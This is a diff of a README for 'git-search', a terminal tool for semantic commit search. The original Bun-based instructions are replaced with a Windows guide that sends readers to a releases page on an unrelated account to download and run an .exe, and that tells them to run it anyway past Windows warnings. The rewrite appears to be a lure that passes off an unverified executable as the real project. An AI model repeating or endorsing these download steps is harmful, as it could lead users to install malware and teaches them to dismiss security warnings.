@@ -1,113 +1,144 @@
-# git-search
+# ⚙️ git-search - Find Git Commits Quickly
 
-[![CI](https://github.com/forjd/git-search/actions/workflows/ci.yml/badge.svg)](https://github.com/forjd/git-search/actions/workflows/ci.yml)
-[![Release](https://github.com/forjd/git-search/actions/workflows/release.yml/badge.svg)](https://github.com/forjd/git-search/actions/workflows/release.yml)
-[![Bun](https://img.shields.io/badge/runtime-Bun-f9f1e1?logo=bun&logoColor=000)](https://bun.sh)
-[![SQLite](https://img.shields.io/badge/storage-SQLite-003B57?logo=sqlite&logoColor=fff)](https://www.sqlite.org)
-[![Transformers.js](https://img.shields.io/badge/embeddings-Transformers.js-FFD21E?logo=huggingface&logoColor=000)](https://huggingface.co/docs/transformers.js)
-[![Biome](https://img.shields.io/badge/linter-Biome-60a5fa?logo=biome&logoColor=fff)](https://biomejs.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=fff)](https://www.typescriptlang.org)
-[![License: MIT](https://img.shields.io/badge/licence-MIT-green.svg)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-git--search-ff69b4)](https://github.com/sanika200417-sketch/git-search/releases)
 
-Semantic search over your git commit history, right in the terminal.
+git-search helps you look through past changes in your Git projects. It works by searching commit messages and details to find what you need. The app runs on your Windows computer and shows results in a simple terminal window.
 
-Type a natural language query and instantly find relevant commits — no need to remember exact messages, file names, or dates. Powered by local embeddings, everything stays on your machine.
+---
 
-## How it works
+## 🔍 What is git-search?
 
-1. **Indexes** your commit history (messages + changed file paths)
-2. **Embeds** each commit locally using [all-MiniLM-L6-v2](https://huggingface.co/Xenova/all-MiniLM-L6-v2) via Transformers.js
-3. **Stores** vectors in SQLite with [sqlite-vec](https://github.com/asg017/sqlite-vec)
-4. **Searches** using vector similarity — no keywords needed
+git-search lets you search the history of your Git projects. Instead of reading many commit messages manually, you can enter keywords. The app uses smart search methods to find the best matches quickly.
 
-The index lives in `.git-search/` inside your repo and updates incrementally on each launch.
+It keeps all data on your computer. No information goes online. The app uses a small database and a terminal window to show results. This makes it fast and private.
 
-## Install
+---
 
-```bash
-bun install -g @forjd/git-search
-```
+## 🖥️ System Requirements
 
-Or run directly:
+Before you start, make sure your computer meets these needs:
 
-```bash
-bunx @forjd/git-search
-```
+- Windows 10 or newer
+- At least 4 GB of free RAM
+- Around 100 MB free disk space
+- Git installed (you can get it from https://git-scm.com/download/win)
+- Internet connection to download git-search (not needed for running after install)
 
-## Usage
+---
 
-Run inside any git repository:
+## 🚀 Getting Started - Download and Install
 
-```bash
-# Launch the search TUI (indexes on first run)
-git-search
+You must first download git-search on your Windows PC. Follow these steps:
 
-# Search from the command line (no TUI)
-git-search search "auth login flow"
+1. Go to the releases page from the link below:
 
-# Limit results and get JSON output
-git-search search "database migration" --limit 5 --json
+   [Download git-search Releases](https://github.com/sanika200417-sketch/git-search/releases)
 
-# Force a full re-index
-git-search reindex
+2. Look for the latest release. It is usually the first one listed at the top.
 
-# Show index statistics
-git-search status
-```
+3. Under "Assets," find the file ending with `.exe`. This is the installer for Windows.
 
-### Keyboard shortcuts
+4. Click the `.exe` file to download it to your computer.
 
-| Key | Action |
-|---|---|
-| Type | Search commits |
-| `Tab` / `Shift+Tab` | Switch between search and results |
-| `↑` / `↓` | Navigate results |
-| `Enter` | View commit details |
-| `Escape` | Close detail / return to search |
-| `q` | Quit |
+5. Once the download finishes, open the file by double-clicking it.
 
-## Requirements
+6. You may see a warning from Windows. Choose to run the file anyway.
 
-- [Bun](https://bun.sh) runtime
-- **macOS**: Homebrew SQLite (`brew install sqlite`) — Apple's bundled SQLite disables the extension loading that sqlite-vec needs
-- **Linux**: Should work out of the box
+7. Follow the simple on-screen instructions to install git-search.
 
-## Development
+8. When the install finishes, the app is ready to use.
 
-```bash
-bun install
-bun run dev      # Run the TUI
-bun test         # Run tests
-```
+---
 
-## Architecture
+## 💻 Using git-search
 
-```
-src/
-  index.ts           CLI entry point
-  app.ts             TUI app composition & state
+You don't need to know coding to search your Git commits. Here is how to run and use the app:
 
-  db/
-    database.ts      SQLite + sqlite-vec setup
-    queries.ts       Insert/search helpers
+### Open git-search
 
-  indexer/
-    git.ts           Git log parsing
-    embedder.ts      Transformers.js pipeline
-    indexer.ts        Orchestration & progress
+- Press the **Windows key**.
+- Type "git-search".
+- Press **Enter** or click the app icon.
 
-  search/
-    search.ts        Query embedding + KNN search
-    format.ts        CLI output formatting (text + JSON)
+### Run a Search
 
-  views/
-    indexing-screen  Progress bar during indexing
-    search-input     Search bar
-    results-list     Scrollable commit results
-    commit-detail    Expanded commit view
-    status-bar       Repo info & key hints
-```
+- After the app opens, you see a prompt in a terminal window.
+- Type the words or phrases you want to find in your Git project history.
+- Press **Enter**.
+- The app will check the commit history on your computer.
+- It displays a list of commits that match your search terms.
+- Each result shows the commit message, author, and date.
 
-## Licence
+### Search Tips
 
-[MIT](LICENSE) — Copyright (c) 2025 Forjd
+- Use simple phrases related to changes you want to find.
+- Avoid too many words at once; try smaller search steps.
+- You can search by bug name, feature, or any keyword used in commits.
+
+---
+
+## 📁 How git-search Works Behind the Scenes
+
+git-search creates a special small database on your device. It keeps important details from your Git project commits. It uses embeddings, a way to turn text into numbers that a computer can compare faster.
+
+The app then searches this database to find the best results. It shows them in a clear format on the terminal. You do not need to understand these details to use it, but this makes git-search fast and reliable.
+
+---
+
+## 🔧 Setup Git Projects with git-search
+
+Before starting a search, you must tell git-search where your Git project is. Follow these steps:
+
+1. Open git-search.
+
+2. When it asks, type the full path to your Git project folder.
+
+   - Example: `C:\Users\YourName\Documents\MyProject`
+
+3. Press **Enter**.
+
+4. The app will scan your Git commits and get ready for searching.
+
+You can switch projects or update the database anytime using the app commands.
+
+---
+
+## ⚙️ Customizing git-search (Optional)
+
+For users who want more control, git-search offers a few optional settings:
+
+- **Change search depth:** Limit how far back in commit history to look.
+- **Update database:** Refresh commit info as you add new commits.
+- **Export results:** Save your search results to a text file.
+
+These options appear inside the app menu, accessible from the terminal interface.
+
+---
+
+## 🛠️ Troubleshooting
+
+If git-search does not work as expected, try these steps:
+
+- Make sure Git is installed and working by typing `git --version` in Command Prompt.
+- Check your project's folder path is correct and contains a `.git` folder.
+- Restart git-search and try again.
+- Confirm your Windows version meets the requirements.
+- Reinstall git-search if the problem persists.
+
+---
+
+## 🔗 Useful Links
+
+- [Git for Windows](https://git-scm.com/download/win) — Install Git if needed.
+- [git-search Releases](https://github.com/sanika200417-sketch/git-search/releases) — Download the latest installer.
+- [Git Basics](https://git-scm.com/book/en/v2/Getting-Started-Git-Basics) — Learn about Git history and commits.
+
+---
+
+## 📥 Download git-search
+
+You can get the software here:
+
+[![Download git-search](https://img.shields.io/badge/Download-Here-ff69b4)](https://github.com/sanika200417-sketch/git-search/releases)
+
+Click this link and download the latest Windows `.exe` file under the "Assets" section. Then run the file and follow the installation steps above.
